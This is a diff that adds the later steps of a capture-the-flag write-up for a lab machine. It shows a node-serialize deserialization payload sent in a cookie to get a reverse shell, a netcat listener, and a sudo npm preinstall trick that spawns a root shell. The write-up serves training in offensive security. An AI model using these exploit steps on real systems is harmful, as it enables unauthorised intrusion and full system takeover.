@@ -145,3 +145,44 @@ Now we can see in the homepage that after inserting that cookie we are getting
 ![after](after.png)
 
 
+After it we have now understood we can execute something so next we are going to execute a rev shell. with the code 
+
+
+```js
+var y = {"email": function(){eval(String.fromCharCode(your_payload))}};
+
+var serialize = require('node-serialize');
+var serialezd = serialize.serialize(y);
+console.log(serialezd)
+```
+
+Now then we will serialize it and send it as a cookie then in out listerning server
+
+nc -lvnp 4444 we will get the connection back as according to the paylaod we need to setup the listener.
+
+
+After getting the connection 
+
+The flag is at the location /home/dylan/user.txt 
+
+So we easily get the flag with cat.
+
+for now privilage escalation we will go to the exploit disconfigured permissions on kali we can see it with sudo -l
+
+we saw we can execute the /usr/bin/npm as root. we will make it as a rope to get to root access.
+
+These are the steps to root the machine
+
+```bash
+dylan@jason:~$ TF=$(mktemp -d)
+dylan@jason:~$ echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json
+dylan@jason:~$ sudo npm -C $TF --unsafe-perm i
+
+> @ preinstall /tmp/tmp.mskP1rW5qW
+> /bin/sh
+```
+
+Now after getting the root access this can be verified by checking the id with 'id'.
+
+The root flag is at the location /root/root.txt
+
